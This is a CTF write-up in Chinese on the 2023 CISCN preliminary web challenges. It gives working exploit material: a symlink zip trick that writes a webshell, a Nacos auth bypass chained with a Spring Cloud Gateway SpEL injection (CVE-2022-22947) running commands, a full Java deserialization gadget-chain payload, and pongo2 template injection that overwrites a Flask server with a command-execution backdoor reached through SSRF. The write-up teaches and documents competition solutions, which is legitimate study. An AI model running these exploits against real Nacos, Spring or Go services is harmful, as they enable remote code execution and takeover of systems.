---
title: "2023CISCN 初赛WEB WP"
onlyTitle: true
date: 2024-12-9 21:56:21
categories:
- ctf
- WP
tags:
- CTF
- go ssti
- spring CGW
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8122.png
---



补课

# 2023CISCN

总览：

| Unzip          | php软连接写马                                                |
| -------------- | ------------------------------------------------------------ |
| BackendService | 1. Nacos权限绕过<br />2. Nacos后台打Spring Cloud gateway SpEL注入 |
| deserbug       | CC链                                                         |
| go_session     | 1. 空密钥伪造cookie<br />2. go ssti覆盖写server.py<br />3. SSRF 打热加载Flask |



## Unzip

随便上传一个文件可以看到源码

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240920145319317.png)

这段 PHP 代码的功能是允许用户上传一个文件，并检查该文件是否为 ZIP 格式。如果是 ZIP 文件，它将被解压到服务器的 `/tmp` 目录下。

`$_FILES["file"]["tmp_name"]` 是上传文件在服务器上的临时存储路径。

如果上传一个带马压缩包到服务器，服务器会解压到/tmp，访问即getshell。但这里访问不了/tmp目录

* unzip可以创建软连接

>把某个目录链接到另一个目录下，对这个目录的任何操作都会作用到另一个目录或者文件，原理见
>
>https://www.cnblogs.com/crazylqy/p/5821105.html
>
>发现demo见：
>
>https://xz.aliyun.com/t/2589?time__1311=n4%2Bxni0%3DG%3Di%3D0QAeGNDQTPiIPD5RSgxYve2KQx

创建一个带软连接目录的压缩包，软连接指向网站根目录/var/www/html

再上传一个带马的压缩包，这个压缩包解压到/tmp的软连接目录的同时也会解压到网站根目录

>ln -s /var/www/html ciscn	# 创建软连接
>zip -y link.zip ciscn 	# -y保留链接模式压缩
>rm ciscn  #删去软连接目录
>mkdir ciscn	# 故意相同文件名，方便后续覆盖ciscn指向的文件地址（在该地址添加解压出的文件）
>cd ciscn
>echo 'shell' > shell.php	# 创建木马
>cd ..
>zip -r link1.zip ciscn 	# -r压缩整个文件夹

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240920160348036.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240920160313119.png)



## BackendSerivce

Nacos权限绕过到spring cloud gataway spel表达式注入

https://xz.aliyun.com/t/11493#toc-3

spring cloud gateway CVE-2022-22947 移步我的blog。

https://godownio.github.io/2023/04/19/spring-cloud-gateway-cve-2022-22947-spel-biao-da-shi-zhu-ru/

nacos利用工具，直接进

https://github.com/charonlight/NacosExploitGUI/releases

2.3.2和2.4.0可以直接Derby SQL RCE，

0.1.0<= Nacos <= 2.2.0 权限绕过

这里是探测出来是2.1.0版本。那就权限绕过登进去看看

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240920165635577.png)

登进去

根据

https://xz.aliyun.com/t/11493?u_atoken=70c5589dffd2ae75b8b51f10f52b210d&u_asig=ac11000117268228405895054e007f#toc-4

得知，在SpringCloud GateWay配置文件bootstrap.yml中，看与Nacos连接的情况

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240920170414441.png)

如果服务器开了 /actuator接口，那就能直接POST包进行RCE，不用通过Nacos，不过需要spring cloud服务出网

开启了以下两行配置时，便会开启该接口

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240920193424445.png)

如果没开/actuator接口，或者出不了网，通过Nacos修改配置文件也能RCE

Nacos输入源码bootstrap.yml中spring cloud的IP和Group，查到就开放在本机

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240920200223690.png)

服务中点详情也能看到端口与配置文件想对应。说明Nacos连接了spring cloud gateway，现在想想怎么打spring cloud gateway

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240920200343030.png)

因为这里172.12.xx是内网IP，不能直接打18888端口（访问都访问不了），只能通过Nacos来打

依赖看到

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240920200640976.png)

CVE-2022-22947 影响范围：

Spring Cloud Gateway 3.1.x < 3.1.1

Spring Cloud Gateway 3.0.x < 3.0.7

题目中的backcfg服务节点（就是nacos服务本身，两者是同一个机器）加载配置文件的话就可以在控制台创建backcfg.json配置，之后backcfg服务节点就会自动导入配置。Nacos会自动访问/actuator/gateway/refresh触发路由

配置列表->+->新建配置，payload塞配置内容里发布，记得Data ID填backcfg，因为Spring cloud gataway bootstrap就是写的自动加载nacos这个配置文件

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240920215535807.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240920215706181.png)

标准解，通过加路由的方式触发filter进而代码执行

```json
{
    "spring": {
        "cloud": {
            "gateway": {
                "routes": [
                    {
                        "id": "exam",
                        "order": 0,
                        "uri": "lb://service-provider",
                        "predicates": [
                            "Path=/echo/**"
                        ],
                        "filters": [
                            {
                                "name": "AddResponseHeader",
                                "args": {
                                    "name": "result",
                                    "value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(\"bash反弹shell\").getInputStream())).replaceAll('\\n','').replaceAll('\\r','')}"
                                }
                            }
                        ]
                    }
                ]
            }
        }
    }
}
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240920215507692.png)

yaml也能打

```json
spring:
  cloud:
    gateway:
      routes:
        - id: exam
          order: 0
          uri: lb://service-provider
          predicates:
            - Path=/echo/**
          filters:
            - name: AddResponseHeader
              args:
                name: result
                value: "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(bash反弹shell).replaceAll('\n','').replaceAll('\r','')}"
```



## deserbug

题目hint：

**1 . cn.hutool.json.JSONObject.put->com.app.Myexpect#getAnyexcept**

**2. jdk8u202**

先读一下主函数Testapp，开放8888端口，接收bugstr参数。对bugstr进行base64解码，反序列化。这里存在一个反序列化漏洞

```java
public class Testapp {
    public Testapp() {
    }

    public static void main(String[] args) {
        HttpUtil.createServer(8888).addAction("/", (request, response) -> {
            String bugstr = request.getParam("bugstr");
            String result = "";
            if (bugstr == null) {
                response.write("welcome,plz give me bugstr", ContentType.TEXT_PLAIN.toString());
            }

            try {
                byte[] decode = Base64.getDecoder().decode(bugstr);
                ObjectInputStream inputStream = new ObjectInputStream(new ByteArrayInputStream(decode));
                Object object = inputStream.readObject();
                result = object.toString();
            } catch (Exception var8) {
                Myexpect myexpect = new Myexpect();
                myexpect.setTypeparam(new Class[]{String.class});
                myexpect.setTypearg(new String[]{var8.toString()});
                myexpect.setTargetclass(var8.getClass());

                try {
                    result = myexpect.getAnyexcept().toString();
                } catch (Exception var7) {
                    result = var7.toString();
                }
            }

            response.write(result, ContentType.TEXT_PLAIN.toString());
        }).start();
    }
}
```

由于CC版本为3.2.2，没漏洞不能直接打。8u202也不能打原生反序列化

但是hint：**cn.hutool.json.JSONObject.put->com.app.Myexpect#getAnyexcept**能绕

getAnyexcept()调用newInstance()

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922113210037.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240802170805620.png)

newInstance就是调用构造函数嘛，效果和InstantiateTransformer.transform()一样

根据该图，自然就和CC3接上了

前半段触发JSONObject.put，用到LazyMap.get

CC6，CC5，CC7前半段都能用，至于能不能用，具体环境看下链子就行。只是不能用AnnotationInvocationHandler（jdk>8u65）

CC6拼CC3链子：

```xml
HashMap.readObject->
	TiedMapEntry.hashCode->
		LazyMap.get->
			JSONObject.put->
				Myexpect.getAnyexcept->
					TrAXFilter.TrAXFilter->
						TemplatesImpl.newTransformer
```

需要传三个参数获取TrAXFilter的构造器并实例化

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922114822842.png)

```java
Myexpect myexpect = new Myexpect();
myexpect.setTypeparam(Templates.class);
myexpect.setTargetClass(TrAXFilter.class);
myexpect.setTypearg(templatesClass);
```

**cn.hutool.json.JSONObject.put->com.app.Myexpect#getAnyexcept**

put接收两个参数，你就别管是哪个，不让LazyMap.get报错只能是value为expect。谜语题

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922150238613.png)

向put的key传constantTransformer(myexpect)，当然，CC6后半段的remove、先set假值再换真值的操作不能少

payload：

```java
package org.example;

import cn.hutool.json.JSONObject;
import com.app.Myexpect;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class CISCN_deserbug {
    public static void main(String[] args) throws Exception
    {
        byte[] code1 = Files.readAllBytes(Paths.get("E:\\CODE_COLLECT\\Idea_java_ProTest\\Test\\target\\classes\\bash_shell.class"));
        TemplatesImpl templatesClass = new TemplatesImpl();
        Field[] fields = templatesClass.getClass().getDeclaredFields();
        for (Field field : fields) {
            field.setAccessible(true);
            if (field.getName().equals("_bytecodes")) {
                field.set(templatesClass, new byte[][]{code1});
            } else if (field.getName().equals("_name")) {
                field.set(templatesClass, "godown");
            } else if (field.getName().equals("_tfactory")) {
                field.set(templatesClass, new TransformerFactoryImpl());
            }
        }
        Myexpect myexpect = new Myexpect();
        myexpect.setTypeparam(new Class[]{Templates.class});
        myexpect.setTargetclass(TrAXFilter.class);
        myexpect.setTypearg(new Object[]{templatesClass});
        JSONObject jsonObject = new JSONObject();//CC3TrAXFilter
        Map lazyMap = LazyMap.decorate(jsonObject, new ConstantTransformer("godown"));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "test1");
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(tiedMapEntry, "test2");
        jsonObject.remove("test1");
        Field factory = lazyMap.getClass().getDeclaredField("factory");
        factory.setAccessible(true);
        Field modifiersField = Field.class.getDeclaredField("modifiers");
        modifiersField.setAccessible(true);
        modifiersField.setInt(factory, factory.getModifiers() & ~Modifier.FINAL);
        factory.set(lazyMap, new ConstantTransformer(myexpect));
        serialize(hashMap);
        System.out.println(base64encode(Files.readAllBytes(Paths.get("E:\\CODE_COLLECT\\Idea_java_ProTest\\Test\\ser.bin"))));
        unserialize("ser.bin");
    }
    public static String base64encode(byte[] bytes) throws Exception
    {
        Class<?> base64 = Class.forName("java.util.Base64");
        Object Encoder = base64.getMethod("getEncoder").invoke(null);
        return (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder,bytes);
    }
    public static void serialize(Object obj) throws Exception
    {
        java.io.FileOutputStream fos = new java.io.FileOutputStream("ser.bin");
        java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(fos);
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String Filename) throws Exception {
        java.io.FileInputStream fis = new java.io.FileInputStream(Filename);
        java.io.ObjectInputStream ois = new java.io.ObjectInputStream(fis);
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}

```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922152014066.png)



**cn.hutool.json.JSONObject.put->com.app.Myexpect#getAnyexcept**的调用链相当复杂，由于是bean getter类型的触发，getAnyexcept向上不能查找用法，导致反向分析异常困难。又是一道CTF谜语题，传参直接靠蒙



## go_session

goland，启动！

ok，进来就看到main.go三个路由转发路径

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922153439924.png)

route.go定义了三个路由处理函数：

* Index：获取用户会话，若未设置用户名，则默认为“guest”，并返回问候消息。
* Admin：检查用户是否为管理员，不是则返回错误；从查询参数获取名字（默认为“ssti”），进行 XSS 防护处理后渲染模板并返回。
* Flask：检查会话中的用户名，然后向本地运行的 Flask 服务器发起 HTTP GET 请求，并将响应内容返回给客户端。

思路也很明确，伪造session为admin后打pongo2的ssti。那flask路由有什么用呢？

带着这个疑惑开始猜谜，猜测根本没有设置环境变量SESSION_KEY。

本地搭建后在浏览器获取到空密钥得到的guest cookie

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241209194051970.png)

```
MTczMzc0NDQwNXxEWDhFQVFMX2dBQUJFQUVRQUFBal80QUFBUVp6ZEhKcGJtY01CZ0FFYm1GdFpRWnpkSEpwYm1jTUJ3QUZaM1ZsYzNRPXy9no2SoHj-LhX7qsACbZUDjr3nhKjR7v8iTpv6qJ83pw==
```

和靶机的cookie相同，符合猜谜

修改name值为admin，能拿到admin的cookie

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241209194627662.png)

```
MTczMzc0NDkzM3xEWDhFQVFMX2dBQUJFQUVRQUFBal80QUFBUVp6ZEhKcGJtY01CZ0FFYm1GdFpRWnpkSEpwYm1jTUJ3QUZZV1J0YVc0PXx9VHD8fgMEvqUWF-KwBidg8If0fTSh8a3uZYJQX7HK8g==
```

但是go的ssti并不能直接rce

### go ssti

简单介绍一下 pongo2的ssti

* 任意读文件

```go
{{ include "/etc/passwd" }}
```

* 版本探测

```go
{{ pongo2.version }}
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241209201942251.png)

* 绕过字符串过滤

go可以通过函数获取http头信息，进而获取任意字符串

gin http.Request结构体如下：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241209201526884.png)

可以通过gin Context的Request.Header获取头信息（注意：gin会将输入的http头的首字符换成大写字符）

比如这里在这里有html.EscapeString过滤双引号，无法直接读文件，可以构造`aaa: /etc/passwd`的http头，以下payload读文件

```
name={%25%20include%20c.Request.Header.Aaa[0]%20%25}
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241209202455138.png)



* 任意文件写

通过SaveUploadedFile搭配FormFile写文件

SaveUploadedFile参数如下，接收一个`*multipart.FileHeader`对象，一个String作为目标路径。注意到SaveUploadedFile是在gin包的context下，`*multipart.FileHeader`对象必然来自http对象

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241209204112724.png)

查看用例可以发现context_test.go中用的FormFile生成的`*multipart.FileHeader`对象

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241209204513188.png)

跟进到FormFile，调用了ParseMultipartForm从Context解析文件，并调用了request.go 的FormFile

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241209204831159.png)

这是一个调用ParseMultipartForm从Request解析文件

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241209205308652.png)

两个FormFile返回的`*multipart.FileHeader`对象都能直接在SaveUploadedFile中使用

比如会解析以下上传文件的数据包（不是题目的环境，而是一个上传文件的普通环境）

```http
POST /upload HTTP/1.1
Host: localhost
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 193
Content-Type: multipart/form-data; boundary=01f54ee8f2872c8a0d42d14f70cdc1fe

--01f54ee8f2872c8a0d42d14f70cdc1fe
Content-Disposition: form-data; name="file"; filename="test.png"
Content-Type: image/png

This is the file content
--01f54ee8f2872c8a0d42d14f70cdc1fe--
```

得到的f和fhs如下

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241209210327544.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241209210224173.png)

现在无需上传接口，通过ssti我们能构造向靶机写入任意文件。由于go语言的特性，函数的返回值必须被接收或使用空白标识符 _ 忽略，所以两个返回值的request FormFile无法直接调用

写文件：

```http
GET /admin?name={{c.SaveUploadedFile(c.FormFile(c.Request.Header.Filename[0]),c.Request.Header.Filepath[0])}} HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: Phpstorm-c886be16=4fe54ddd-bac0-49c8-891f-b23f2d87d891; session-name=MTczMzc0NDkzM3xEWDhFQVFMX2dBQUJFQUVRQUFBal80QUFBUVp6ZEhKcGJtY01CZ0FFYm1GdFpRWnpkSEpwYm1jTUJ3QUZZV1J0YVc0PXx9VHD8fgMEvqUWF-KwBidg8If0fTSh8a3uZYJQX7HK8g==
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Content-Length: 191
Content-Type: multipart/form-data; boundary=01f54ee8f2872c8a0d42d14f70cdc1fe
Filename: file
Filepath: ./server.py

--01f54ee8f2872c8a0d42d14f70cdc1fe
Content-Disposition: form-data; name="file"; filename="test.png"
Content-Type: image/png

This is the file content
--01f54ee8f2872c8a0d42d14f70cdc1fe--
```



### 题解

写文件跟这道题有什么关系呢？

传参`/flask?name=`，有报错信息。

报错页面由Werkzeug Debugger提供。而Werkzeug Debugger 是 Flask 在调试模式下的默认功能

* 热加载

通常，设置 `debug=True` 会启用 Flask 的调试模式，默认会激活 Werkzeug 的热加载功能。

```python
if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=True)
```

调试模式中的热加载功能会在代码发生更改时，自动重新加载 Flask 服务

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241209213829479.png)

报错还提到了 PIN 控制台：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241209214150902.png)

当 Flask 热加载功能启用时，每次重新加载会生成新的 PIN，用于保护调试控制台。

当前flask服务器路径为`/app/server.py`

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241209214344328.png)

看到这里思路也就清晰了

先通过admin路由go ssti覆盖写server.py，然后SSRF请求flask服务器执行server.py

恶意flask server：

```python
from flask import *
import os
app = Flask(__name__)

@app.route('/')
def index():
    name = request.args['name']
    file=os.popen(name).read()
    return file

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
```



写/app/server.py

```http
GET /admin?name={{c.SaveUploadedFile(c.FormFile(c.Request.Header.Filename[0]),c.Request.Header.Filepath[0])}} HTTP/1.1
Host: efcbd611-8c54-4abc-a9ae-a74d2278a0da.challenge.ctf.show
Cookie: session-name=MTczMzc0NDkzM3xEWDhFQVFMX2dBQUJFQUVRQUFBal80QUFBUVp6ZEhKcGJtY01CZ0FFYm1GdFpRWnpkSEpwYm1jTUJ3QUZZV1J0YVc0PXx9VHD8fgMEvqUWF-KwBidg8If0fTSh8a3uZYJQX7HK8g==
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Referer: https://ctf.show/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-site
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive
Content-Length: 421
Content-Type: multipart/form-data; boundary=01f54ee8f2872c8a0d42d14f70cdc1fe
Filename: file
Filepath: /app/server.py

--01f54ee8f2872c8a0d42d14f70cdc1fe
Content-Disposition: form-data; name="file"; filename="test.png"
Content-Type: image/png

from flask import *
import os
app = Flask(__name__)

@app.route('/')
def index():
    name = request.args['name']
    file=os.popen(name).read()
    return file

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
--01f54ee8f2872c8a0d42d14f70cdc1fe--
```



双重url编码SSRF

```
?name=?name=ls%25%32%30/
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241209215157076.png)

```
?name=?name=cat%25%32%30/th1s_1s_f13g
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241209215219048.png)
